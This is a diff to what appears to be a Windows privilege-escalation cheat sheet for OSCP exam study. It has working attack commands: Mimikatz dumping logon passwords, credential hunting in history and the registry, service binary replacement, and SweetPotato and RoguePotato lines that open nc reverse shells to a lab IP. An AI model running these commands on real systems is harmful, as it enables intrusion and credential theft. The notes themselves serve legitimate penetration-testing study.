@@ -17,11 +17,13 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 ```
 
 
-## PowerUp.ps1 (Source)
+## PowerUp.ps1 (Kali Source)
 Checks for privilege escalation vectors. **Offers cmdlets to also abuse vulnerabilities, but should be avoided on the OSCP, as they may be considered a violation of the no "auto-exploit" rule.**
 https://blog.certcube.com/powerup-cheatsheet/
+
+Source: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
 ```
-https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1
 ```
 
 ## PowerUp AllChecks
@@ -29,17 +31,12 @@ https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Pow
 Invoke-AllChecks
 ```
 
-## WinPEAS (GitHub Source)
-Fundamental for OSCP. Always run and read output thoroughly.
-```
-https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
-```
-
 ## WinPEAS (Kali Source)
+Fundamental for OSCP. Always run and read output thoroughly.
+Source: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 ```
 /usr/share/peass/winpeas/winPEASx64.exe
 ```
-
 
 # Manual Context Gathering
 
@@ -137,6 +134,7 @@ https://github.com/AlessandroZ/LaZagne
 ```powershell
 Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue
 ```
+- Attempt to run, or download and use `strings` on unusual executables
 
 ## Get PowerShell command history
 ```powershell
@@ -152,7 +150,7 @@ Get-History
 ```powershell
 Get-ChildItem -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue
 ```
-## Check for auto-login credentials in registry
+## Check for autologon credentials in registry
 ```cmd
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 ```
@@ -173,9 +171,9 @@ cmdkey /list
 /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
 ```
 
-## Run Mimikatz to extract logon passwords
+## Mimikatz extract logon passwords
 ```cmd
-.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > logonpasswords.txt
 ```
 
 ## Run Mimikatz to extract WDigest credentials
@@ -242,10 +240,6 @@ Get-UnquotedService
 Get-ModifiableServiceFile
 ```
 
-## PowerUp Write-ServiceBinary
-```
-Write-ServiceBinary
-```
 
 Start/stop a service, foo, to replace its binary with a malicious one
 `net stop foo`
@@ -309,7 +303,7 @@ Compile in Windows VM with Visual Studio.
 https://github.com/CCob/SweetPotato
 ```
 
-## Run SweetPotato for privilege escalation
+## SweetPotato (nc shell)
 ```cmd
 .\SweetPotato.exe -p .\nc.exe -a "192.168.45.196 4440 -e cmd.exe"
 ```
@@ -318,6 +312,11 @@ https://github.com/CCob/SweetPotato
 ## Rogue Potato (Source). For >= Windows 10 1809 & Windows Server 2019
 ```
 https://github.com/antonioCoco/RoguePotato
+```
+
+## Rogue Potato (nc shell)
+```
+.\RoguePotato.exe -r 192.168.45.246 -e "C:\users\chris\downloads\nc.exe 192.168.45.246 4441 -e cmd.exe" -l 9999
 ```
 
 
